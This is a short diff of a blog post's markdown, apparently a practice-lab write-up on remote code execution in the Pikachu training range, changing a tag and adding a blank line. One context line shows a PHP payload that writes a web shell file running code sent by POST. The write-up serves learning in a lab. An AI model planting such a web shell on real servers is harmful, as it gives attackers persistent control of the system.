@@ -3,7 +3,7 @@ layout: post
 title: pikachu-01 RCE
 author: PWN022
 tags:
-- Network security
+- 靶场实践
 date: 2025-10-04 00:08 +0800
 toc:  true
 excerpt: ""
@@ -149,4 +149,5 @@ fputs(fopen('shell.php','w'),'<?php assert($_POST[fin]);?>');
 ![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-3.png)
 
 ![](https://cdn.jsdelivr.net/gh/PWN022/0x00@main/NetSecurity/My_screenshot/rce2-4.png)
+
 
